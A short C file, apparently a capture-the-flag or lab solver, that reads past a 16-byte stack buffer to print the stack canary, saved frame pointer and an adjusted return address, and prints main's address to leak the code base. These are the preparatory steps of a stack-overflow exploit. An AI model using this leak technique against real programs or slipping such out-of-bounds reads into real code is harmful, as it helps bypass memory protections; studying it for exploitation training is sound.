#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
 	char buf[16] = "hello, world!";
 
    fptr("%016llx", *((unsigned long long*)(buf + 0x18)));
 	fptr("canary\n");
    fptr("%llx", *((unsigned long long*)(buf + 0x20)));
 	fptr("rbp\n");
    fptr("%llx", *((unsigned long long*)(buf + 0x28)) + 0xab);
 	fptr("return_addr\n");
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}